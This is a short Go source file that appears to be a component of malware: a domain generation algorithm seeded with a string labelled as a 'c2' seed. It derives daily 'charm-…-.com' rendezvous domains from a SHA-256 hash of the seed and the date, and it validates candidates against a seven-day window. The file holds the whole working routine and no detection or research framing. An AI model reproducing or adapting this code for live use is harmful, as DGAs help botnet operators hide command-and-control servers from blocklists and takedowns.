package dga

import (
	"crypto/sha256"
	"fmt"
	"time"
)

const seed = "chameleon-c2-seed-2026"

func GenerateDomain(t time.Time) string {
	dateStr := t.Format("20060102")
	h := sha256.Sum256([]byte(seed + ":" + dateStr))
	part1 := fmt.Sprintf("%08x", uint32(h[0])<<24|uint32(h[1])<<16|uint32(h[2])<<8|uint32(h[3]))
	part2 := fmt.Sprintf("%04x", uint32(h[4])<<8|uint32(h[5]))
	return fmt.Sprintf("charm-%s-%s.com", part1, part2)
}

func GenerateDomains(days int) []string {
	now := time.Now()
	domains := make([]string, days)
	for i := 0; i < days; i++ {
		domains[i] = GenerateDomain(now.AddDate(0, 0, i))
	}
	return domains
}

func Today() string {
	return GenerateDomain(time.Now())
}

func IsValidDomain(domain string) bool {
	domains := GenerateDomains(7)
	for _, d := range domains {
		if d == domain {
			return true
		}
	}
	return false
}
